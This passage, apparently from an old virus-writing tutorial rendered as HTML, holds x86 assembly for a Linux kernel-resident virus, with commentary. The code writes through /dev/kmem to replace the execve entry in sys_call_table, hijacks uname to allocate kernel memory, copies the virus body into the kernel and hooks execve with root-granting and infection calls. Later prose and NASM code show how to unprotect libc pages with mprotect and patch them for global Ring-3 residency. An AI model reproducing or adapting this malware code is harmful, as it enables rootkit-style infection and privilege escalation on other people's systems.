+&nbsp; &nbsp; &nbsp; &nbsp; movl %eax,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # routine for access /dev/kmem by means<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# of exploits<br/>
+&nbsp; <br/>
+&nbsp;# Realize that ESI still have the address of the sys_call_table, and if to<br/>
+&nbsp;# that we add 44, we will obtain a pointer to the address where is the ptr<br/>
+&nbsp;# to execve inside the sys_call_table<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; leal 44(%esi),%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # lseek to sys_call_table[SYS_execve]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call seekfilestart<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $orgexecve,%ecx &nbsp; &nbsp; &nbsp; &nbsp; # Read pointer'</span>s value<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">4</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # <span style="color: #ff0000;">4</span> bytes<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> readfile<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; leal <span style="color: #ff0000;">488</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Now move the coresponding entry to <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> seekfilestart &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # uname inside the sys_call_table<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span>taskptr<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # <span style="color: #00007f; font-weight: bold;">And</span> read the sys_call_table<span style="color: black;">&#91;</span>SYS_uname<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">4</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # value<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">and</span> store it <span style="color: #00007f; font-weight: bold;">in</span> the var taskptr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> readfile<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl taskptr<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Move ourselves to the <span style="color: #0000ff; font-weight: bold;">code</span> where is the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> seekfilestart &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # uname function <span style="color: #00007f; font-weight: bold;">in</span> memory<span style="color: #339933;">.</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl <span style="color: #0000ff; font-weight: bold;">$</span>endhookspace<span style="color: #339933;">-</span>hookspace<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">esp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Reserve space <span style="color: #00007f; font-weight: bold;">in</span> the <span style="color: #0000ff; font-weight: bold;">stack</span> for the <span style="color: #0000ff; font-weight: bold;">code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# that i<span style="color: #7f007f;">'m going to overwrite<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esp,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Read the code i'</span>m going to overwrite<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span>endhookspace<span style="color: #339933;">-</span>hookspace<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">edx</span> # of uname on the <span style="color: #0000ff; font-weight: bold;">stack</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> readfile<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl taskptr<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Return to the beginning of uname routine<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> seekfilestart<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl filesize<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl <span style="color: #0000ff; font-weight: bold;">$</span>virend<span style="color: #339933;">-</span>vircode<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>virendvircodefilesize<br/>
+<br/>
+&nbsp;# Now <span style="color: #0000ff; font-weight: bold;">write</span> the routine for reserve memory over uname<span style="color: #7f007f;">'s code<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $hookspace,%ecx &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $endhookspace-hookspace,%edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call writefile<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $122,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Make a call to uname, but what'</span>s really<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">0x80</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# going to be executed will be our routine<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>codeto &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # <span style="color: #46aa03; font-weight: bold;">EAX</span> = address we<span style="color: #7f007f;">'ve reserved<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl taskptr,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Go back to uname'</span>s <span style="color: #0000ff; font-weight: bold;">code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> seekfilestart<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# <span style="color: #00007f; font-weight: bold;">And</span> restore the uname<span style="color: #7f007f;">'s original<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $endhookspace-hookspace,%edx # that we had temporally in stack <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call writefile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# to its original place.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $endhookspace-hookspace,%esp # Remove the memory we had reserved<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # in the stack<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl $aftreturn-vircode,orgexecve &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl codeto,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Move now the pointer to the begin <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl %ecx,orgexecve &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # of the mem zone we had reserved<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call seekfilestart<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $vircode,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# And write the virus code in it<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $virend-vircode,%edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call writefile<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; leal 44(%esi),%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Search the sys_call_table, relative<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call seekfilestart &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# to execve, and i modify the orig.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # pointer by our function<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $newexecve-vircode,codeto<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $codeto,%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Write the new ptr in sys_call_table<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $4,%edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call writefile<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call closefile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# close /dev/kmem<br/>
+<br/>
+tmpend:<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call exit<br/>
+<br/>
+openfile: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # System calls made with int 0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $5,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# EAX = Function to do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # see /usr/include/sys/syscall.h for a function<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # list<br/>
+<br/>
+closefile:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $6,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret<br/>
+<br/>
+readfile:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $3,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret<br/>
+<br/>
+writefile:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $4,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret<br/>
+<br/>
+seekfilestart:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $19,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; xorl %edx,%edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret<br/>
+<br/>
+rmfile:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $10,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret<br/>
+<br/>
+<br/>
+exit:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; xorl %eax,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; incl %eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+<br/>
+<br/>
+thissym: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Here are defined some variables<br/>
+.string &quot;sys_call_table&quot; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# See that they'</span>re <span style="color: #00007f; font-weight: bold;">in</span> the same <span style="color: #0000ff; font-weight: bold;">section</span> of<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # the <span style="color: #0000ff; font-weight: bold;">code</span><span style="color: #339933;">.</span> That<span style="color: #7f007f;">'s why we use mprotect.<br/>
+thissym1:<br/>
+.string &quot;current&quot;<br/>
+<br/>
+thissym2:<br/>
+.string &quot;kmalloc&quot;<br/>
+<br/>
+devkmem:<br/>
+.string &quot;/dev/kmem&quot;<br/>
+<br/>
+e_entry:<br/>
+.long 0x666<br/>
+<br/>
+infect: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Infection routine<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;# Here should go the ELF infection routine. It consist in generate a<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;# temporal file with the virus code and execute it with execve<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;ret<br/>
+<br/>
+.global newexecve<br/>
+newexecve:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %ebp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esp,%ebp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# In the stack will be all regs,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# see that we'</span>re inside an <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">0x80</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #ff0000;">8</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushal<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">0x666</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# If <span style="color: #46aa03; font-weight: bold;">EBX</span> = <span style="color: #ff0000;">0x666</span><span style="color: #339933;">,</span> we return <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> notserv &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # <span style="color: #ff0000;">0x667</span> because it<span style="color: #7f007f;">'s the residency<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popal &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # mark.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; incl 8(%ebp) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ebx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ebp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret<br/>
+notserv:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call ring0recalc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Calculate the displacement of<br/>
+ring0recalc: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# addresses in memory<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %edi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl $ring0recalc,%edi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl syscalltable(%edi),%ebp &nbsp; &nbsp; &nbsp; &nbsp;# EBP = Address of sys_call_table<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call saveuids &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call makeroot &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call infect &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Infect the file<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call loaduids &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+hookoff:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popal<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ebx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ebp<br/>
+.byte &nbsp; 0xe9 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Go to the original execve func.<br/>
+orgexecve: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# 0xE9 is the jump opocode and the<br/>
+.long &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # next 4 bytes are the &nbsp;4 bytes<br/>
+aftreturn: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# if the orgexecve variable. The<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # equivalent would be jmp orgexecve<br/>
+syscalltable: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+.long 0<br/>
+<br/>
+current:<br/>
+.long 0<br/>
+<br/>
+.global hookspace &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# This is the routine that reserves memory.<br/>
+hookspace: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Its the one that is overwritten by the virus<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; push %ebp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# over uname.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %ebx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %ecx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esp,%ebp<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl $3<br/>
+.byte &nbsp; 0x68<br/>
+virendvircodefilesize:<br/>
+.long &nbsp; 0<br/>
+.byte &nbsp; 0xb8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # movl $xxx,%eax ;0xb8 is the opcode of a movl and<br/>
+kmalloc: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # the next bytes correpond with the kmalloc var,<br/>
+.long &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# so, when we find kmalloc in mem, a <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; call %eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# movl $kmalloc,%eax will be generated<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# and with call %eax we jump to kmalloc for reserve<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# memory &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %ebp,%esp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ecx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ebx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %ebp &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ret &nbsp; &nbsp; <br/>
+<br/>
+.global endhookspace<br/>
+endhookspace:<br/>
+.global virend<br/>
+virend:<br/>
+</span></div>
+<h3>Global residency in Ring-3</h3>
+<p>The base of this method of residency consists in the hook of routines in Ring-3 and that are executed by all the processes.</p>
+<p>The code of Ring-3 that can be executed by all the processes are the libraries, in windows are the DLLs.</p>
+<p>Windows, for example, distributes its space in 4 arenas, each arena has a different utility and has differend code and data. There is one arena dedicated to DOS that goes from the virtual address 0 to 40000000, another one dedicated to the PerProcess memory, that goes from 40000000 to 80000000, another that handles the shared memory by all the processes that goes from 80000000 to C0000000, and another dedicated to VXD, i.e. kernel's code, that is executed in Ring-0 and goes from C0000000 to FFFFFFFF.</p>
+<p>The most important library in windows is the KERNEL32.DLL, and there are the functions of file creation, memory handling, etc. (in linux the equivalent could be the library libc).</p>
+<p>The files, instead of execute directly TRAP GATES for make the calls to Ring-0 code, use a dynamic link mechanism for jump to library's code (Ring-3 code) that do the jump to Ring-0 for obtain the desired kernel service. Windows 95 commited a great dessign fail, and it is the fact that it loads the majority of libraries in the shared memory arena (KERNEL32 library is load at BFF70000 address). To locate the most important libraries into a shared memory arena has the advantage that the system doesn't have to load the library with each file that imports calls to that library, because it's in the process memory. This fact also makes possible the hook of system calls without the need of jump to Ring-0. Viruses like Win95.HPS and Win95.K32 use this fact for achieve global residence without jumping to Ring-0. However this is not as easy as it gets, because even if the kernel doesn't have protection by pagination, the files have protection by pagination in the code sections (for handle the try of write into the code sections). However, this could be unprotected easily using VXD calls like _pagemodifypermissions or library calls like memoryprotect.</p>
+<p>In Linux we could try to hook functions like execve of the libc library, located from the virtual address 0x40000000. Any try of a program of write to protected pages will mean protection faults, because there is pagination prtoection in the code sections, as in the code sections of the normal executables. But the function mprotect also works with library's code, because these are located below 0xC0000000, in the PerProcess memory. Code as the one that follows allows you to unprotect pages of libraries like libc. As we saw in the introduction, the address of the getpid function of libc its loaded in the address 0x40073000 in my Linux version, so we know that it's a code section, so it would be protected againist write attempts.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">section</span> <span style="color: #0000ff; font-weight: bold;">.text</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">extern</span> puts<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">global</span> main<span style="color: black;">&#93;</span><br/>
+<br/>
+main<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">pushad</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0125h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40073000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">07h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Call to mprotect </span><br/>
+&nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40073000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Put EAX to 0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Write EAX value in EBP address</span><br/>
